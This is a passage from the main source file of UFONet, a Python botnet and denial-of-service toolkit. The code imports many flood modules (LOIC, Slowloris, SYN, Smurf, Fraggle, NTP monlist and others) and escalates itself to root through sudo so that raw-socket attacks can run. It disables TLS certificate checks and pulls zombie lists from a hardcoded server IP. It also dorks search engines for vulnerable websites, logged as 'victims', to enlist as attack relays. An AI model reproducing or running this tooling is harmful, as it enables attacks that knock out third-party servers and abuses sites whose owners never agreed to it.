#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, sys, re, traceback, random, time, threading, base64, string, math
import io, socket, ssl, cgi, json, gzip
try:
    from urllib.parse import urlparse as urlparse
except:
    from urlparse import urlparse as urlparse
try:
    import urllib.request, urllib.error, urllib.parse
except:
    print ("\n[Error] UFONet no longer supports Python2: (https://www.python.org/doc/sunset-python-2/)\n\n[Info] [AI] Try to run the tool with Python3.x.y (ex: python3 ufonet)\n")
    sys.exit()
from uuid import getnode
from random import randrange, shuffle
from .options import UFONetOptions
from .update import Updater
from .herd import Herd
from .zombie import Zombie
from .doll import Doll
from core.tools.inspector import Inspector
from core.tools.abductor import Abductor
from core.tools.ufoscan import UFOSCAN
from core.mods.loic import LOIC
from core.mods.loris import LORIS
from core.mods.ufosyn import UFOSYN
from core.mods.spray import SPRAY
from core.mods.smurf import SMURF
from core.mods.xmas import XMAS
from core.mods.nuke import NUKE
from core.mods.tachyon import TACHYON
from core.mods.monlist import MONLIST
from core.mods.sniper import SNIPER
from core.mods.ufoack import UFOACK
from core.mods.uforst import UFORST
from core.mods.droper import DROPER
from core.mods.overlap import OVERLAP
from core.mods.pinger import PINGER
from core.mods.ufoudp import UFOUDP
from core.mods.fraggle import FRAGGLE

DEBUG = False # use 'True' for detailed traceback

class UFONet(object):
    def __init__(self):
        self.exit_msg = 'Donate BTC (Bitcoin) to keep UFONet (https://ufonet.03c8.net) strong!' # set msg show at the end [FILO ;-)]
        self.blackhole = '176.28.23.46' # default download/upload zombies [Blackhole] [Server] / Try [DIY] your own [Mirror]...
        self.GIT_REPOSITORY = 'https://code.03c8.net/epsylon/ufonet' # oficial code source [OK! 22/12/2018]
        self.GIT_REPOSITORY2 = 'https://github.com/epsylon/ufonet' # mirror source [since: 04/06/2018]
        self.github_zombies = 'https://raw.githubusercontent.com/epsylon/ufonet/master/botnet/' # default [RAW] download/upload zombies [Blackhole] [GitHub] [DIY]
        self.external_check_service1 = 'https://status.ws/' # set external check service 1 [OK! 26/02/2020]
        self.external_check_service2 = 'https://downforeveryoneorjustme.com/' # set external check service 2 [OK! 26/02/2020]
        self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site
        self.check_ip_service1 = 'https://checkip.org/' # set external check ip service 1 [OK! 06/06/2020]
        self.check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 06/06/2020]
        self.check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! [06/06/2020]
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
        self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve [Zombies]
        self.aliens_file = 'botnet/aliens.txt' # set source path to retrieve [Aliens]
        self.dnss_file = 'botnet/dns.txt' # set source path to retrieve [DNSs]
        self.droids_file = 'botnet/droids.txt' # set source path to retrieve [Droids]
        self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
        self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
        self.ntps_file = 'botnet/ntp.txt' # set source path to retrieve [NTPs]
        self.snmps_file = 'botnet/snmp.txt' # set source path to retrieve [SNMPs]
        self.humans_file = 'botnet/humans.txt' # set source path to retrieve 'humans'
        self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve [Dorks]
        self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
        self.timeline_file = 'docs/VERSION' # set source for code releases
        self.links_file = "data/links.txt" # set source path to retrieve [Blackhole] [Links]
        self.streams_file = "data/streams.txt" # set source path to retrieve [Blackhole] [Streams]
        self.globalnet_file = "data/globalnet.txt" # set source path to retrieve [Blackhole] [Globalnet]
        self.news_file = "data/news.txt" # set source path to retrieve [Blackhole] [News]
        self.missions_file = "data/missions.txt" # set source path to retrieve [Blackhole] [Missions]
        self.board_file = "data/board.txt" # set source path to retrieve [Blackhole] [Board]
        self.grid_file = "data/grid.txt" # set source path to retrieve [Blackhole] [Grid]
        self.wargames_file = "data/wargames.txt" # set source path to retrieve [Blackhole] [Wargames]
        self.examples_file = "docs/examples.txt" # set source path to retrieve [Examples]
        self.misc_file = "core/txt/misc.txt" # set source path to retrieve [Miscellania] cites
        self.referer = '' # black magic
        self.port = "8080" # default injection port
        self.mothershipname = "core/txt/shipname.txt"
        self.default_mothership_name = "l4m3r-lulz/0\n" # default mothership name
        self.mothership_baptism() # generating static name/id for your mothership ;-)
        self.head = False
        self.payload = False
        self.external = False
        self.attack_mode = False
        self.connection_failed = False
        self.total_possible_zombies = 0
        self.herd = Herd(self)
        self.sem = False
        self.db_flash = 0 # db stress counter
        self.total_aliens = 0 
        self.aliens_hit = 0
        self.aliens_fail = 0
        self.total_droids = 0
        self.droids_hit = 0
        self.droids_fail = 0
        self.total_ucavs = 0
        self.ucavs_hit = 0
        self.ucavs_fail = 0
        self.total_rpcs = 0
        self.rpcs_hit = 0
        self.rpcs_fail = 0
        self.total_loic = 0
        self.total_loris = 0
        self.total_syn = 0
        self.total_spray = 0
        self.total_smurf = 0
        self.total_fraggle = 0
        self.total_xmas = 0
        self.total_ufoack = 0
        self.total_uforst = 0
        self.total_droper = 0
        self.total_overlap = 0
        self.total_pinger = 0
        self.total_ufoudp = 0
        self.total_nuke = 0
        self.total_tachyon = 0
        self.total_monlist = 0
        self.total_sniper = 0
        self.total_zombies_failed_connection = 0
        self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.nat_error_flag = "OFF"
        self.trans_zombies = 0
        self.scanned_zombies = 0
        self.loadcheck_counter = 0
        self.loadcheck_prev_size = None
        self.loadcheck_prev_load = None
        self.loadcheck_first_size = None
        self.loadcheck_first_load = None
        self.loadcheck_size_list = []
        self.loadcheck_load_list = []
        self.loadcheck_size_median = None
        self.loadcheck_size_max = None
        self.loadcheck_size_min = None
        self.loadcheck_load_median = None
        self.loadcheck_size_max = None
        self.loadcheck_size_min = None
        self.num_is_up = 0 # counter for [UCAVs] 'up' reports
        self.num_is_down = 0 # counter for [UCAVs] 'down' reports
        self.expire_timing = 30 # default expiring time per round
        self.extra_zombies_lock = False # used to lock threading flow when [ARMY] is required
        self.ac_control = [] # used by 'herd.py' to lock threading flow when [Zombies] are returning

    def mothership_baptism(self):
        if os.path.exists(self.mothershipname) == True:
            f = open(self.mothershipname)
            self.mothership_id = f.read()
            f.close()
        else:
            self.mothership_ids = [] 
            try:
                f = open(self.motherships_file)
                motherships = f.readlines()
                f.close()
                for ship in motherships:
                    ship = ship.encode("utf-8")
                    self.mothership_ids.append(base64.urlsafe_b64encode(ship))
                try:
                    self.mothership_id = str(base64.b64decode(random.choice(self.mothership_ids).strip()), 'utf-8')
                except:
                    try:
                        self.mothership_id = str(base64.b64decode(random.choice(self.mothership_ids).strip()), 'latin-1')+"\n" # id (hack&slash!) creation ;-)
                    except:
                        self.mothership_id = self.default_mothership_name
            except:
                self.mothership_id = self.default_mothership_name
            if len(str(self.mothership_id.upper())) > 20: # motherhip naming anti-cheating! ;-)
                self.mothership_id = self.default_mothership_name 
            m = open(self.mothershipname, "w") # write mothership name to a static file
            m.write(str(self.mothership_id.upper()))
            m.close()

    def create_options(self, args=None):
        self.optionParser = UFONetOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def banner_welcome(self):
        print("")
        print("          ||          /\        ||              #===============================================#")
        print("        -(00)-     + (XX) +   -(00)-            ||                                             ||")
        print("   ||     ||      *~~~~~~~~*    ||        ||    ||  > Botnet [DDoS]   #  > Close Combat [DoS]  ||")
        print(" -(00)-          (0)  XX  (0)           -(00)-  ||                                             ||")
        print("   ||             \| (00) |/              ||    ||     |-> ZOMBIES    #     |-> LOIC           ||")
        print("        (O)_  (O)  0'----'0  (O)  _(O)          ||     |-> DROIDS     #     |-> LORIS          ||")   
        print("            |  |.''.( xx ).''.|  |              ||     |-> ALIENS     #     |-> UFOSYN         ||")
        print("            .'.'   X|'..'|X   '.'.              ||     |-> UCAVs      #     |-> XMAS           ||")
        print("     .-.  .' /'--.__|_00_|__.--'\ '.  .-.       ||     |-> X-RPCs     #     |-> NUKE           ||")
        print("    (O).)-|0|  \   x| ## |x   /  |0|-(.(O)      ||     |-> DBSTRESS   #     |-> UFOACK         ||")
        print("     `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'       ||     |-> SPRAY      #     |-> UFORST         ||")
        print("        _ | ||  '-.___||___.-'  || | _          ||     |-> SMURF      #     |-> DROPER         ||")
        print("     .' _ | ||==O |   __   | O==|| | _ '.       ||     |-> TACHYON    #     |-> OVERLAP        ||")
        print("    / .' ''.|  || | /_00_\ | ||  |.'' '. \      ||     |-> MONLIST    #     |-> PINGER         ||")
        print("    | '###  |  =| | ###### | |=  |' ###  |      ||     |-> FRAGGLE    #     |-> UFOUDP         ||")
        print("    | |(0)| '.  0\||__**_ ||/0  .' |(0)| |      ||     |-> SNIPER     #                        ||")
        print("    \ '._.'   '.  | \_##_/ |  .'   '._.' /      ||                                             ||")
        print("     '.__ ____0_'.|__'--'__|.'_0____ __.'       #|=============================================|#")
        print("    .'_.-|            YY            |-._'.      ||                                             ||")
        print("                                                ||  -> [ UFONet: https://ufonet.03c8.net ] <-  ||") 
        print("    + Class: PSYoPs / ViPR404+ (model I^) +     ||                                             ||")
        print("                                                #|=============================================|#") 
        print("")

    def banner(self):
        print('='*75, "\n")
        print("888     888 8888888888 .d88888b.  888b    888          888    ")   
        print("888     888 888        d88P Y888b 8888b   888          888    ")
        print("888     888 888       888     888 88888b  888          888    ")
        print("888     888 8888888   888     888 888Y88b 888  .d88b.  888888 ")
        print("888     888 888       888     888 888 Y88b888 d8P  Y8b 888    ")
        print("888     888 888       888     888 888  Y88888 88888888 888    ")
        print("Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  ")
        print(" 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888")       
        print(self.optionParser.description, "\n")
        print('='*75)

    def generate_exit_msg(self):
        self.exit_msg = "Generating random exit... \n\n"
        try:
            f = open(self.misc_file)
            m = f.readlines()
            f.close()
            self.exit_msg += " -> "+str(random.choice(m).strip())
        except:
            self.exit_msg += " -> Donate BTC (Bitcoin) to keep #UFONet (https://ufonet.03c8.net) strong!" 

    def AI(self):
        try:
            import turtle as AI
            print("\n[AI] Making a unique drawing using 'Turtle' (Feurzig & Papert - 1966) -> [OK!]\n")
            colors = ['red', 'purple', 'blue', 'green', 'orange', 'yellow']
            bg = random.choice(colors).strip()
            t = AI.Pen() 
            AI.bgcolor(bg)
            r = random.randrange(100,100000) 
            for x in range(r):
                t.pencolor(colors[x%6])
                w = random.randrange(100,1000) 
                t.width(x/w + 1) 
                t.forward(x)
                l = random.randrange(50,1000) 
                t.left(l) 
        except:
            print("[AI] %!$1#9#84#~... -> [Exiting!]")
            pass

    def round_float(self, num):
        return str(int(round(num, -1)))[2] # black magic

    def show_mac_address(self):
        mac = getnode() # to get physical address
        hex_mac = str(":".join(re.findall('..', '%012x' % mac)))
        return hex_mac

    def show_ips(self):
        import requests
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)) 
            private_ip = s.getsockname()[0] # black magic
            s.close()
        except:
            private_ip = "Unknown"
        try:
            public_ip = requests.get(self.check_ip_service3).text
        except:
            try:
                public_ip = requests.get(self.check_ip_service2).text
            except:
                try:
                    public_ip = requests.get(self.check_ip_service1).text
                except:
                    public_ip = "Unknown"
        return private_ip, public_ip

    def try_running(self, func, error, args=None):
        options = self.options
        args = args or []
        try:
            return func(*args)
        except Exception as e:
            if DEBUG == True:
                print(error, "error")
                traceback.print_exc()

    def checkeuid(self):
        try:
            euid = os.geteuid()
        except:
            print("[Error] [AI] [UFONet] doesn't work correctly in systems with closed licenses...-> [Exiting!]\n")
            print("[AI] "+self.exit_msg+"\n")
            sys.exit(2) # return
        return euid

    def start_ship_engine(self):
        self.agents = [] # generating available user-agents
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)
        self.user_agent = random.choice(self.agents).strip()
        self.search_engines = [] # available dorking search engines
        self.search_engines.append('bing') # [01/02/2020: OK!]
        self.search_engines.append('yahoo') # [01/02/2020: OK!]
        self.search_engines.append('duck') # [01/02/2020: OK!]
        #self.search_engines.append('startpage') # [01/02/2020: deprecated! -> blocking instream params search]
        #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
        #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
        if not os.path.exists("core/json/"): # create gui json cfg files folder
            os.mkdir("core/json/")
        self.banner_welcome()
        self.update_flying_stats() # update flying time stats
        chargo = self.check_mothership_chargo() # check mothership chargo
        self.update_max_chargo(int(chargo)) # update max chargo stats
        self.generate_exit_msg() # generate random exit msg

    def run(self, opts=None):
        if opts:
            self.create_options(opts)
        options = self.options

        # start threads
        if not self.options.threads:
            self.options.threads=5 # default number of threads
        self.sem = threading.Semaphore(self.options.threads)

        # start ship engine
        self.start_ship_engine()

        # check proxy options
        proxy = options.proxy
        if options.proxy:
            try:
                pattern = 'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
                m = re.search(pattern, proxy)
                if m is None:
                    self.banner()
                    print ("\n[Error] [AI] Proxy malformed! (ex: 'http(s)://127.0.0.1:8118') -> [Exiting!]\n")
                    return
                else:
                    self.proxy_transport(options.proxy) # create proxy transport (also here, to be sure)
            except Exception:
                self.banner()
                print ("\n[Error] [AI] Proxy malformed! (ex: 'http(s)://127.0.0.1:8118') -> [Exiting!]\n")
                return

        # check tor connection
        if options.checktor:
            url = self.check_tor_url # TOR status checking site
            self.banner()
            print("\nSending request to: " + url + "\n")
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request(url, None, headers)
                tor_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                if not tor_reply or 'Congratulations' not in tor_reply:
                    print("It seems that Tor is not properly set.\n")
                    print(("IP address appears to be: " + your_ip + "\n"))
                else:
                    print("Congratulations!. Tor is properly being used :-)\n")
                    print(("IP address appears to be: " + your_ip + "\n"))
            except:
                print("Cannot reach TOR checker system!. Are you correctly connected?\n")
                sys.exit(2) # return

        # run AES256+HMAC-SHA1 enc/dec tool
        if options.cryptomsg:
            from core.tools.crypter import Cipher
            print("  " + '='*44)
            print("                                            ")
            print("          ____...------------...____        ")
            print("     _.-'' /o/__ ____ __ __  __ \o\_`'-._   ")
            print("   .'     / /                    \ \     '. ")
            print("   |=====/o/======================\o\=====| ")
            print("   |____/_/________..____..________\_\____| ")
            print("   /   _/ \_     <_o#\__/#o_>     _/ \_   \ ")
            print("   \__/_____\####/0213411543/####/_____\__/ ")
            print("    |===\!/========================\!/===|  ")
            print("    |   |=|          .---.         |=|   |  ")
            print("    |===|o|=========/     \========|o|===|  ")
            print("    |   | |         \() ()/        | |   |  ")
            print("    |===|o|======{'-.) A (.-'}=====|o|===|  ")
            print("    | __/ \__     '-.\\uuu/.-'    __/ \__ |  ")
            print("    |==== .'.'^'.'.====|====.'.'^'.'.====|  ")
            print("    |  _\o/   __  {.' __  '.} _   _\o/  _|  ")
            print("    ''''''''''''''''''''''''''''''''''''''  ")
            print("\n     + UFONet Crypter (AES256+HMAC-SHA1)")
            print("  (140 plain text chars = 69 encrypted chars)\n")
            print("  " + '='*44 + "\n")
            text = str(input("-> Enter TEXT: "))
            input_key = str(input("\n-> Enter KEY: "))
            key = base64.b64encode(input_key.encode('utf-8')).decode('utf-8')
            c = Cipher(key, text)
            msg = c.encrypt()
            msg = msg.decode('utf-8')
            c.set_text(msg)
            print("\n" + "  " + '-'*44)
            print('\n-> Ciphertext: [', msg, ']')
            print('\n-> Length:', len(msg))
            print("\n" + "  " + '-'*44)
            print('\n-> Key (share it using SNEAKNET!):', input_key)
            print('\n-> Decryption PoC:', c.decrypt().decode('utf-8'), "\n")
 
        # run shownet tool
        if options.shownet:
            hex_mac = self.show_mac_address()
            self.banner()
            print("-> Network Info:")
            print('='*44)
            print("-"*35)
            print("|- MAC Address :", hex_mac)
            print("|" +"-"*34)
            private_ip, public_ip = self.show_ips()
            print("|- IP Private  :", private_ip)
            print("|" +"-"*34)
            t = urlparse(self.check_ip_service3)
            name_service = t.netloc
            print("|- IP Public   :", public_ip +" | ["+name_service+"]")
            print("-"*35)
            print('='*75, "\n")

        # run UFOSCAN tool (check EUID when running UFOSCAN)
        if options.xray:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [UFOSCAN] (--xray) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running
            else:
                if not options.xrayps:
                    options.xrayps = str("1-1024") # default scanning ports (1-1024)
                ports = options.xrayps
                try:
                    portX, portY = ports.split('-')
                    try:
                        portX = int(portX)
                        portY = int(portY)
                    except:
                        portX = 1
                        portY = 1024
                        print("[Error] [AI] [UFOSCAN] Something wrong with range of ports selected. Using by default: 1-1024...\n")
                except:
                    portX = 1
                    portY = 1024
                    print("[Info] [AI] [UFOSCAN] Not any range of ports selected. Using by default: 1-1024...\n")
                self.banner()
                print("\n[AI] Analizing target to extract interesting information... Be patient!\n")
                print('='*22 + '\n')
                try:
                    self.instance = UFOSCAN() # instance main class for scanning operations
                    xray = self.instance.scanning(options.xray, portX, portY)
                except Exception as e:
                    print ("[Error] [AI] Something wrong scanning... Not any data stream found! -> [Exiting!]\n")
                    if DEBUG == True:
                        traceback.print_exc()
                    return

        # show code timeline
        if options.timeline:
            f = open(self.timeline_file, 'r')
            releases = f.readlines()
            f.close()
            self.banner()
            print("-> Code timeline:")
            print('='*44)
            print("-"*35)
            for r in releases:
                print(r.strip('\n'))
            print("-"*35)
            print('='*75, "\n")

        # print some examples
        if options.examples:
            f = open(self.examples_file, 'r')
            examples = f.readlines()
            f.close()
            self.banner()
            for e in examples:
                print(e.strip('\n'))

        # check EUID when running UFOSYN (root required for open 'raw sockets') / GUI will invoke 'sudo' directly
        if options.ufosyn:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [UFOSYN] (--ufosyn) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args) 
                except:
                    pass # keep running, but UFOSYN will fail

        # check EUID when running SPRAY (root required)
        if options.spray:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [SPRAY] (--spray) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but SPRAY will fail

        # check EUID when running SMURF (root required)
        if options.smurf:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [SMURF] (--smurf) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but SMURF will fail

        # check EUID when running FRAGGLE (root required)
        if options.fraggle:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [FRAGGLE] (--fraggle) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but FRAGGLE will fail

        # check EUID when running XMAS (root required)
        if options.xmas:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [XMAS] (--xmas) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but XMAS will fail

        # check EUID when running UFOACK (root required)
        if options.ufoack:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [UFOACK] (--ufoack) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but UFOACK will fail

        # check EUID when running UFORST (root required)
        if options.uforst:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [UFORST] (--uforst) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but UFORST will fail

        # check EUID when running DROPER (root required)
        if options.droper:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [DROPER] (--droper) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but DROPER will fail

        # check EUID when running OVERLAP (root required)
        if options.overlap:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [OVERLAP] (--overlap) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but OVERLAP will fail

        # check EUID when running PINGER (root required)
        if options.pinger:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [PINGER] (--pinger) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but PINGER will fail

        # check EUID when running UFOUDP (root required)
        if options.ufoudp:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [UFOUDP] (--ufoudp) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but UFOUDP will fail

        # check EUID when running NUKE (root required)
        if options.nuke:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [NUKE] (--nuke) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but NUKE will fail

        # check EUID when running TACHYON (root required)
        if options.tachyon:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [TACHYON] (--tachyon) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but TACHYON will fail

        # check EUID when running MONLIST (root required)
        if options.monlist:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [MONLIST] (--monlist) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but MONLIST will fail

        # check EUID when running SNIPER (root required)
        if options.sniper:
            euid = self.checkeuid()
            if euid != 0:
                print("[Info] [AI] [Control] [SNIPER] (--sniper) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args)
                except:
                    pass # keep running, but SNIPER will fail

        # search for [Zombies] on search engines results (dorking)
        if options.search:
            zombies = []
            if options.engine:
                engine = options.engine
            else:
                engine = "duck" # default search engine
            try:
                self.banner()
                if not os.path.exists(self.humans_file) == True:
                    f = open(self.humans_file, 'w')
                    f.close()
                lf = open(self.humans_file, 'r')
                restored = lf.readlines()
                zombies_restored = len(restored)
                lf.close()
                lz = open(self.zombies_file, 'r')
                zombies_army = lz.readlines()
                for zombie in zombies_army:
                    zombies.append(zombie) # add zombies from army to the zombies pool
                lz.close()
                if len(restored) > 0:
                    print("\n[Info] [AI] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n")
                    if not self.options.forceyes:
                        backup_reply = input("[AI] Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                        print('-'*25)
                    else:
                        backup_reply = "Y"
                    if backup_reply == "n" or backup_reply == "N":
                        print("\n[Info] [AI] Removing data stored and starting a new search...\n")
                        os.remove(self.humans_file)
                        zombies_restored = 0 # flush zombies restored
                        print('-'*25 + "\n")
                    else:
                        print("\n[Info] [AI] Restoring data and starting a new search...\n")
                        print('-'*25 + "\n")
                        for zombie in restored:
                            zombies.append(zombie) # add previous data to zombies pool
                if options.allengines:
                    if options.ex_engine: # exclude some search engines manually
                        exclude = options.ex_engine.split(",")
                        for ex in exclude:
                            ex = ex.lower()
                            if ex in self.search_engines:
                                if len(self.search_engines) == 1: # at least one should make it
                                    pass
                                else:
                                    self.search_engines.remove(ex)
                    for e in self.search_engines:
                        engine = e
                        print('='*44)
                        print(("\n[AI] Searching for zombies using: "+engine+'\n'))
                        print('='*44 + '\n')
                        self.options.engine = engine
                        try:
                            zombies_chain = self.search_zombies(dork='', zombies_found=zombies)
                            if zombies_chain != None:
                                for zombie in zombies_chain:
                                    if zombie not in zombies: # evade possible repetitions
                                        zombies.append(zombie)
                        except:
                            if zombies: # backup all new zombies found to file in case of exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                else:
                    if restored:
                        print('='*44)
                    print(("\n[AI] Searching for zombies using: "+engine+"\n"))
                    print('='*44 + '\n')
                    if restored: # from restored file
                        try:
                            zombies_chain = self.search_zombies(dork='', zombies_found=zombies)
                            if zombies_chain != None:
                                for zombie in zombies_chain:
                                    if zombie not in zombies: # evade possible repetitions
                                        zombies.append(zombie)
                        except:
                            if zombies: # backup all new zombies found to file in case of exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                    else:
                        try:
                            zombies = self.search_zombies(dork='', zombies_found=zombies)
                        except:
                            if zombies: # backup all new zombies found to file in case of exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                total_restored = zombies_restored
                new_zombies = 0 # new zombies counter
                f = open(self.zombies_file, 'r')
                zz = f.readlines()
                f.close()
                zombies_found = []
                for z in zombies:
                    if z.endswith(os.linesep):
                        z = z.replace(os.linesep, "")
                    if z not in zz and z+os.linesep not in zz:
                        new_zombies = new_zombies + 1
                        zombies_found.append(z)
                print('='*62)
                print("\n- Victims found:", len(zombies_found), "\n")
                print("    - Restored:", total_restored)
                print("    - Dorked:", abs(len(zombies_found) - total_restored), "\n")
                print('-'*32)
                print("\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n")
                print('='*62 + '\n')
                if len(zombies) > 0:
                    if not self.options.forceyes:
                        check_backup_reply = input("[AI] Do you want to save the results for a future search? (Y/n)\n")
                        print('-'*25)
                    else:
                        check_backup_reply = "Y"
                    if check_backup_reply == "n" or check_backup_reply == "N":
                        if os.path.isfile(self.humans_file): 
                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
                        print("\n[Info] [AI] Temporal data correctly removed...\n")
                    else:
                        with open(self.humans_file, "w") as f:
                            for z in zombies_found:
                                if z.endswith(os.linesep):
                                    z = z.replace(os.linesep, "")
                                if z not in zz or z+os.linesep not in zz:
                                    f.write(z+os.linesep)
                        f.close()
                        print("\n[Info] [AI] Correctly saved at: 'botnet/humans.txt'\n")
                    print('-'*25 + "\n")
                if new_zombies and new_zombies > 0:
                    if not self.options.forceyes:
                        check_url_link_reply = input("[AI] Do you want to check if NEW possible zombies are valid? (Y/n)\n")
                        print('-'*25 + "\n")
                    else:
                        check_url_link_reply = "Y"
                    if check_url_link_reply == "n" or check_url_link_reply == "N":
                        print("[AI] "+self.exit_msg+"\n")
                        pass
                    else:
                        print("\n" + '='*44)
                        test = self.testing(zombies_found)
                else:
                    print("[Info] [AI] NOT any NEW possible zombies found -> [Exiting!]\n")
            except Exception:
                print(("\n[Error] [AI] Something wrong searching using: "+engine+"\n"))

        # search for [Zombies] from a list of [Dorks]
        if options.dorks:
            if options.engine:
                engine = options.engine
            else:
                engine = "duck" # default search engine
            try:
                dorks = self.extract_dorks()
                if not dorks:
                    return
                zombies = []
                self.banner()
                if not os.path.exists(self.humans_file) == True:
                    f = open(self.humans_file, 'w')
                    f.close()
                lf = open(self.humans_file, 'r')
                restored = lf.readlines()
                zombies_restored = len(restored)
                lf.close()
                lz = open(self.zombies_file, 'r')
                zombies_army = lz.readlines()
                for zombie in zombies_army:
                    zombies.append(zombie) # add zombies from army to the zombies pool
                lz.close()
                if len(restored) > 0:
                    print("\n[Info] [AI] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n")
                    if not self.options.forceyes:
                        backup_reply = input("[AI] Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                        print('-'*25)
                    else:
                        backup_reply = "Y"
                    if backup_reply == "n" or backup_reply == "N":
                        print("\n[Info] [AI] Removing data stored and starting a new search...\n")
                        os.remove(self.humans_file)
                        zombies_restored = 0 # flush zombies restored
                        print('-'*25 + "\n")
                    else:
                        print("\n[Info] [AI] Restoring data and starting a new search...\n")
                        print('-'*25 + "\n")
                        for zombie in restored:
                            zombies.append(zombie) # add previous data to zombies pool
                total_restored = zombies_restored
